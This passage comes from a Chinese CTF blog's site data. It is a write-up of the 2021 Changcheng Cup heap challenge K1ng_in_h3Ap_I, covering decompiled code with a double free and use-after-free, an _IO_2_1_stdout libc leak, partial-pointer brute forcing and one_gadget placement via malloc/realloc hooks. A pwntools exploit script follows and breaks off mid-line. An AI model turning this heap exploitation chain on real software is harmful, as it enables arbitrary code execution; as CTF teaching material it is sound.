run</span><br></pre></td></tr></table></figure></p><p>  最终结果如下图所示<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯2021</title>
      <link href="/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AF2021/"/>
      <url>/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AF2021/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  美好的一个中秋假期，然而基友们都去见女朋友了。。。只有自己在打比赛，太惨了！！！<br>  虽然如此，<strong>女生只会影响我拔剑的速度</strong>。还是来总结一下这场比赛的骚思路更现实一些😶</p><h1 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h1><p>  <a href="K1ng_in_h3Ap.tar.gz">点击下载题目附件</a></p><h2 id="题目保护"><a href="#题目保护" class="headerlink" title="题目保护"></a>题目保护</h2><p>  如下图所示，基本保护全开<br>  <img src="K1ng_in_h3Ap保护机制.PNG" alt="K1ng_in_h3Ap保护机制"></p><h2 id="题目逻辑"><a href="#题目逻辑" class="headerlink" title="题目逻辑"></a>题目逻辑</h2><p>  其就是一个标准的菜单堆，框架如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  nothing();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = read_int();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        edit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>add</code>功能，就是添加一个给定输入大小的内存块，逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input size:&quot;</span>);</span><br><span class="line">  v2 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">240</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  chunks[v1] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  result = size;</span><br><span class="line">  size[v1] = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  对于<code>delete</code>功能，其就是<code>free</code>掉申请的内存。但是这里并没有置0，从而导致存在<code>double free</code>问题。其逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v0 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">0</span> || v0 &gt; <span class="number">10</span> || !chunks[v0] || !size[v0] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)chunks[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  另外，则是<code>edit</code>功能，就是根据<code>add</code>时的数据，重新向内存中写入数据。由于前面<code>delete</code>处的漏洞，则这里存在严重的<code>UAF</code>。其逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">15</span> || !chunks[v1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input context:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read_input(chunks[v1], size[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  最后，则是唯一的一个受限输出，其逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  glibc下的题目基本都是模板题——如果开启了PIE和地址随机化，则就是泄露glibc基址，然后调用相关系统调用即可</p><p>  这里明显没有可以控制的输出函数。但是一般的输出函数会输出<strong><em>IO_2_1_stdout</em>-&gt;_IO_write_base</strong>地址处<strong><em>IO_2_1_stdout</em>-&gt;<em>IO_write_ptr - _IO_2_1_stdout</em>-&gt;_IO_write_base</strong>大小的字节。则通用的套路就是改小<strong><em>IO_2_1_stdout</em>-&gt;_IO_write_base</strong>的值，从而让输出函数多输出一些内容，而这里面往往就会包含有glibc相关的数据</p><p>  由于有了基址，则通过<code>UAF</code>，我们可以向<code>__free_hook</code>或<code>__malloc_hook</code>中写入<strong>one_gadget</strong>，从而最终获取shell</p><h2 id="套路姿势"><a href="#套路姿势" class="headerlink" title="套路姿势"></a>套路姿势</h2><h3 id="IO-2-1-stdout泄露glibc基址"><a href="#IO-2-1-stdout泄露glibc基址" class="headerlink" title="_IO_2_1_stdout泄露glibc基址"></a>_IO_2_1_stdout泄露glibc基址</h3><p>  一般情况下，我们需要一个指向<strong>_IO_2_1_stdout</strong>结构体附近的内存块，从而写入覆盖的数据<br>  由于<strong>_IO_2_1_stdout</strong>结构体附近(_IO_2_1_stdout - 0x40 + 5 - 8)恰好有一个可以伪造成<strong>0x71</strong>的fast bin(fast bin的SIZE字段0x7f等效于0x71)，如下所示<br>  <img src="IO_2_1_stdout伪造chunk.PNG" alt="_IO_2_1_stdout伪造chunk"></p><p>  则我们只需要在将该伪造chunk插入相关的fast bin链中。则申请内存时，该伪造chunk可以当做正常的内存被返回，则直接我们只需要输入如下数据，即可将<strong>_IO_2_1_stdout-&gt;_IO_write_base</strong>的低位覆盖为<strong>\x00</strong>，从而输出函数会输出更多内容<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padding * <span class="number">51</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure></p><h3 id="覆盖链表指向"><a href="#覆盖链表指向" class="headerlink" title="覆盖链表指向"></a>覆盖链表指向</h3><p>  如果没有可控的输出函数，则我们很难获取堆地址，这对于修改空闲链表的指向阻碍很大(因为我们没法将链表的指向修改到已有的合法堆空间)中，但是并非完全没有办法。</p><p>  如果我们的要求仅仅是将链表指向修改到相近的堆地址中，则可以通过覆盖链表指向的后几位，从而更改链表的指向。</p><p>  一般这个用来和前面<strong><em>IO_2_1_stdout</em></strong>配合使用的。<br>  如果一个fast bin上保留有<strong>unsorted bin</strong>等的fd信息，则该值和<strong><em>IO_2_1_stdout</em></strong>一般仅仅低16位不同，而由于低12位是固定的，因此覆盖掉该fast bin的后16位，有<script type="math/tex">\frac{1}{16}</script>的可能性，其指向<strong><em>IO_2_1_stdout</em></strong>处伪造的chunk。因此只需要稍加爆破，即可成功利用</p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>  在glibc中，我们会进行使用<strong>one_gadget</strong>——将其写入got表中或返回地址中，然后通过执行该地址处的代码，从而一步获取shell。当然，好东西都是有代价的，其执行需要有诸多的限制，如栈中数据或寄存器的要求，如下所示<br>  <img src="one_gadget约束.PNG" alt="one_gadget约束"></p><p>  而有时，栈上数据或寄存器确实无法满足这些要求，则我们就很难使用该条件。<br>  实际上，有两个解决办法</p><h4 id="double-free触发malloc-printerr"><a href="#double-free触发malloc-printerr" class="headerlink" title="double free触发malloc_printerr"></a>double free触发malloc_printerr</h4><p>   当我们触发了<strong>malloc_printerr</strong>时，其会调用<strong>malloc</strong>。如果设置了<strong>__malloc_hook</strong>为<strong>one_gadget</strong>，恰好有<strong>[esp+0x50]==0</strong>。<br>   因此，我们只需要将<strong>__malloc_hook</strong>的值覆写为约束条件为<strong>[esp + 0x50] == 0</strong>的约束条件的<strong>one_gadget</strong>，然后连续释放两次相同的chunk即可</p><h4 id="抬高栈基址"><a href="#抬高栈基址" class="headerlink" title="抬高栈基址"></a>抬高栈基址</h4><p>  我们有指向<code>__malloc_hook</code>的指针，则问题就好办多了——因为<code>__realloc_hook</code>就在<code>__malloc_hook</code>旁边</p><p>  一般，如果有指向<code>__malloc_hook</code>的指针，都是指向<code>__malloc_hook</code>周边伪造的fast bin，如下所示<br>  <img src="malloc_hook伪造chunk.PNG" alt="__malloc_hook伪造chunk"></p><p>  因此，如果我们将<code>__malloc_hook</code>设置为<code>realloc</code>的地址，同时将<code>__realloc_hook</code>的地址设置为<strong>one_gadget</strong>，则实际上仍然相当于执行了<strong>one_gadget</strong>。但是一般函数开始部分都是<strong>push</strong>指令，其会降低栈地址，则我们跳过几个<code>realloc</code>的<strong>push</strong>指令的话，仍然会执行<strong>one_gadget</strong>，但是相对栈基址位移处的实际地址变大了，相当于抬高栈帧，则很容易满足<strong>one_gadget</strong>的约束。<br>  这里首先给出<code>realloc</code>部分汇编代码及其偏移，如下所示<br>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">84710</span>:<span class="number">41</span> <span class="number">57</span>                <span class="keyword">push</span>   %r15</span><br><span class="line"><span class="number">84712</span>:<span class="number">41</span> <span class="number">56</span>                <span class="keyword">push</span>   %r14</span><br><span class="line"><span class="number">84714</span>:<span class="number">41</span> <span class="number">55</span>                <span class="keyword">push</span>   %r13</span><br><span class="line"><span class="number">84716</span>:<span class="number">41</span> <span class="number">54</span>                <span class="keyword">push</span>   %r12</span><br><span class="line"><span class="number">84718</span>:<span class="number">49</span> <span class="number">89</span> f4             <span class="keyword">mov</span>    %rsi,%r12</span><br><span class="line">8471b:<span class="number">55</span>                   <span class="keyword">push</span>   %rbp</span><br><span class="line">8471c:<span class="number">53</span>                   <span class="keyword">push</span>   %rbx</span><br><span class="line"><span class="number">8471d</span>:<span class="number">48</span> <span class="number">89</span> fb             <span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line"><span class="number">84720</span>:<span class="number">48</span> <span class="number">83</span> ec <span class="number">38</span>          <span class="keyword">sub</span>    <span class="number">$0</span>x38,%rsp</span><br><span class="line"><span class="number">84724</span>:<span class="number">48</span> 8b <span class="number">05</span> a5 f8 <span class="number">33</span> <span class="number">00</span> <span class="keyword">mov</span>    <span class="number">0x33f8a5</span>(%rip),%rax        # 3c3fd0 &lt;_IO_file_jumps@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>+<span class="number">0x8f0</span>&gt;</span><br><span class="line">8472b:<span class="number">48</span> 8b <span class="number">00</span>             <span class="keyword">mov</span>    (%rax),%rax</span><br><span class="line">8472e:<span class="number">48</span> <span class="number">85</span> c0             <span class="keyword">test</span>   %rax,%rax</span><br><span class="line"><span class="number">84731</span>:0f <span class="number">85</span> <span class="number">21</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">jne</span>    <span class="number">84958</span> &lt;__libc_realloc@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>+<span class="number">0x248</span>&gt;</span><br></pre></td></tr></table></figure></p><p>  这里展示一下抬栈姿势，我们就以<code>[rsp + 0x30] = 0</code>约束为例，其余是类似的。<br>  如果我们简单的直接修改<strong>__malloc_hook</strong>为<strong>realloc@@GLIBC_2.2.5</strong>，再将<strong>__realloc_hook</strong>更改为<strong>one_gadget</strong>，则其最后面临如下情况<br>  <img src="rsp+0x30约束下one_gadget栈上数据1.PNG" alt="rsp+0x30约束下one_gadget栈上数据1"></p><p>  根据前面<strong>realloc@GLIBC_2.2.5</strong>汇编代码可以看到，从<strong>realloc</strong>到<strong>one_gadget</strong>，其将栈地址下调了<strong>0x70</strong>，而<code>[rsp + 0x30 - 0x70] != 0</code>，即不满足<strong>one_gadget</strong>约束。但是我们发现<code>[rsp + 0x30 - 0x70 + 0x8 * 4]</code>处存在满足约束的数据——则我们只需要抬高栈基址0x20，即减少四次<code>push</code>指令，即可满足<strong>one_gadget</strong>约束。<br>  因此，根据前面给出的<code>realloc</code>汇编代码，我们将<strong>__malloc_hook</strong>设置为<strong>realloc@@GLIBC_2.2.5 + 8</strong>，仍然将<strong>__realloc_hook</strong>更改为<strong>one_gadget</strong>即可，此时情况如下所示<br>  <img src="rsp+0x30约束下one_gadget栈上数据2.PNG" alt="rsp+0x30约束下one_gadget栈上数据2"></p><p>  则我们只需要在<code>__malloc_hook</code>附近输入如下指令，即可完成<strong>one_gadget</strong>的利用<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padding * <span class="number">0xb</span> + p64(lib_base + one_gadget) + p64(lib_base + lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + offset)</span><br></pre></td></tr></table></figure></p><h2 id="题解和关键说明"><a href="#题解和关键说明" class="headerlink" title="题解和关键说明"></a>题解和关键说明</h2><p>  首先，我们需要一个指向<strong><em>IO_2_1_stdout</em></strong>附近的内存块，一般通过释放超过<strong>fast bin</strong>大小的内存来获取，然后在通过覆盖已有的fast bin链指针，将该fake chunk插入链上，相关代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wp_add(r, <span class="number">0</span>, <span class="number">0xd0</span>)<span class="comment">#base</span></span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x10</span>)<span class="comment">#base</span></span><br><span class="line">wp_delete(r, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">wp_add(r, <span class="number">1</span>, <span class="number">0x60</span>)<span class="comment">#base</span></span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x60</span>)<span class="comment">#base + 0x70</span></span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)<span class="comment">#base + 0x70 * 2</span></span><br><span class="line"></span><br><span class="line">wp_delete(r, <span class="number">2</span>)</span><br><span class="line">wp_delete(r, <span class="number">3</span>)</span><br><span class="line">wp_edit(r, <span class="number">3</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">wp_edit(r, <span class="number">1</span>, <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">wp_add(r, <span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x60</span>)</span><br></pre></td></tr></table></figure></p><p>  经过这些步骤，此时内存布局如下所示<br>  <img src="K1ng_in_h3Ap_I内存布局1.PNG" alt="K1ng_in_h3Ap_I内存布局1"></p><p>  此时，在0x70大小的fast bin链上，已经形成了<strong>chunk_baes + 0x100</strong>-&gt;<strong>chunk_baes</strong>-&gt;<strong><em>IO_2_1_stdout</em> - 0x43</strong>的链，则我们可以覆盖<strong><em>IO_2_1_stdout</em></strong>的值，从而泄露glibc基址<br>  下面则是普通的伪造chunk，从而修改<strong>__malloc_hook</strong>为<strong>one_gadget</strong>，此时使用前面的抬栈方式即可构建满足约束条件的<strong>one_gadget</strong></p><p>  最后，完整的wp如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">待修改数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span><span class="comment"># 32位使用i386</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">execve_file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">lib_file = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">argv = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">elf.plt[`symbol`] 获取elf文件中导入符号的plt地址</span></span><br><span class="line"><span class="string">elf.got[`symbol`] 获取elf文件中导入符号的got地址</span></span><br><span class="line"><span class="string">elf.sym[&#x27;symbol&#x27;] 获取elf文件中本地符号的函数实际地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> execve_file != <span class="literal">None</span>:</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lib.sym[`symbol`] 获取lib中符号地址</span></span><br><span class="line"><span class="string">lib.search[&#x27;string&#x27;].next() 获取lib中字符串地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> lib_file != <span class="literal">None</span>:</span><br><span class="line">lib = ELF(lib_file)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;-----------------------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">执行爆破攻击</span></span><br><span class="line"><span class="string">只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环</span></span><br><span class="line"><span class="string">否则程序一直进行循环</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_add</span>(<span class="params">r, idx, size</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_delete</span>(<span class="params">r, idx</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_edit</span>(<span class="params">r, idx, context</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input context:&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wp_show</span>(<span class="params">r</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;d&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line"><span class="comment">#r = gdb.debug([execve_file] + argv)# 首先加载当前目录下的动态库文件</span></span><br><span class="line">r = process([execve_file] + argv)<span class="comment"># 首先加载当前目录下的动态库文件</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">wp_add(r, <span class="number">0</span>, <span class="number">0xd0</span>)<span class="comment">#base</span></span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x10</span>)<span class="comment">#base</span></span><br><span class="line">wp_delete(r, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">wp_add(r, <span class="number">1</span>, <span class="number">0x60</span>)<span class="comment">#base</span></span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x60</span>)<span class="comment">#base + 0x70</span></span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)<span class="comment">#base + 0x70 * 2</span></span><br><span class="line"></span><br><span class="line">wp_delete(r, <span class="number">2</span>)</span><br><span class="line">wp_delete(r, <span class="number">3</span>)</span><br><span class="line">wp_edit(r, <span class="number">3</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">wp_edit(r, <span class="number">1</span>, <span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">wp_add(r, <span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">wp_add(r, <span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">wp_add(r, <span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">wp_edit(r, <span class="number">2</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">51</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x88&#x27;</span>)</span><br><span class="line">lib_base = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x7ffff7a0d000</span> - <span class="number">0x7ffff7dd18e0</span></span><br><span class="line">log.info(<span class="string">&#x27;lib_base =&gt; 